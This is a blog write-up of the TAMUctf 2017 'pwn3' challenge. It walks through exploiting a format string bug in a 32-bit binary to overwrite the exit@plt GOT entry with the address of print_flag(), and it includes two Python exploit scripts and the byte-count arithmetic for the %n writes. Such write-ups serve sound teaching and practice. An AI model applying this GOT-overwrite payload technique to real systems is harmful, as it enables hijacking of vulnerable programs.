---
title: "TAMUctf 2017 : pwn150-pwn3"
date: "2017-04-24T17:06:16.000Z"
lastmod: "2017-06-05T15:26:01.000Z"
tags: ["ctf", "pwn", "reverse engineering", "tamuctf2k17"]
images: ["/content/images/2017/04/Selection_649-3.png"]
slug: "tamuctf-2017-pwn150-pwn3"
url: "/tamuctf-2017-pwn150-pwn3/"
---
nc pwn.ctf.tamu.edu 4323   
Bet you can't corrupt my stack now.

## Solution

Well, this time the buffer is safe, but theres a format string vulnerabily and we can use this to print out contents from memory

![](/content/images/2017/04/Selection_668.png)

..as you can see our `AAAA` input can be found at `4` position of stack, remember this later..

Listing the functions we have again a `print_flag()`

![](/content/images/2017/04/Selection_672.png)

But, how to execute this function from a format string vuln? Maybe rewriting `EIP` to `0x080485ab` using `%n`?

![](/content/images/2017/04/Selection_676.png)

Well, disassembling `main()` we can notice there's an `exit()` after the `printf`, in C, something like this:

```c
puts("Enter a word to be echoed:");  
gets(&s);  
printf(&s);  
exit(0);
```

If you manage to set `EIP=0x080485ab` it will print the flag remotely and exits.. no flag 4 u!

Wee need to go deeper..

A good idea is find the address of `exit@plt` on memory and and rewrite it w/ `print_flag()` address.. then `@0x08048673` the program will call your `print_flag()` instead `exit()`

I started by setting a breakpoint at `0x08048673`, disassembling `main()` and `exit@plt` to find the address which he is calling

![](/content/images/2017/04/Selection_677.png)

Another way to do this is w/ objdump..

`objdump -TR ./pwn3 |grep exit`

![](/content/images/2017/04/Selection_678.png)

```
0x80485ab = print_flag  
0x804a01c = exit@plt  
0x80485ab = address exit@plt will jump
```

So, we need to change the `0x08048456` stored @ `0x804a01c` to `0x80485ab`

Now i've created a padding of 128 bytes which i easily can shift to this address using the `%4$30x$n` from format string, remember `%<index><padding>x$n`

```python
import struct

# 0x80485ab = print_flag
# 0x804a01c = exit@plt
# 0x80485ab = address exit@plt will jump

exitplt = 0x804a01c

def pad(s):  
    return s+"X"*(128-len(s))

# A big thx to liveoverflow 4 this padding tip, https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w

exploit = ""  
exploit += struct.pack("I",exitplt)  
exploit += "XXXXXXXXXXXX"  
exploit += "%4$30x "  
exploit += "%4$n "

print pad(exploit)
```

![](/content/images/2017/04/Selection_680.png)

As you can see we've changed the lower two bytes of `0x804a01c` to `0x2f` but it need to be `0x85ab`

```
padding = 30  
0x2f to decimal = 47  
0x85ab to decimal = 34219  
47-30 = 17  
34219-17 = 34202
```

![](/content/images/2017/04/Selection_681.png)

Nice!

Now we need to change the higher 2 bytes to `0x0804`

Exploit update:   
- added more padding and %5$n to write to %5 position of stack too.

```python
import struct

# 0x80485ab = print_flag
# 0x804a01c = exit@plt
# 0x80485ab = address exit@plt will jump

exitplt = 0x804a01c

def pad(s):  
    return s+"X"*(128-len(s))

exploit = ""  
exploit += struct.pack("I",exitplt)  
exploit += struct.pack("I",exitplt+2)  
exploit += "XXXXXXXX"  
exploit += "%4$34202x "  
exploit += "%4$n "  
exploit += "%30x "  
exploit += "%5$n "

print pad(exploit)
```

![](/content/images/2017/04/Selection_683.png)

It works.. we've changed the 2 higher bytes to `0x85cb` but we need `0x0804`

```
padding = 30  
0x10804 - 0x85cb  = 0x8239 # used 0x10804 because 0x0804 is lower than 0x85cb  
0x8239 to decimal = 33337  
+ padding = 33367
```

![](/content/images/2017/04/Selection_684.png)

Perfect :)   
Now we are good to go remotely..

![](/content/images/2017/04/Selection_685.png)

### Final exploit

<script src="https://gist.github.com/intrd/f7375c653cfbba19c62a4012931f27fd.js"></script>
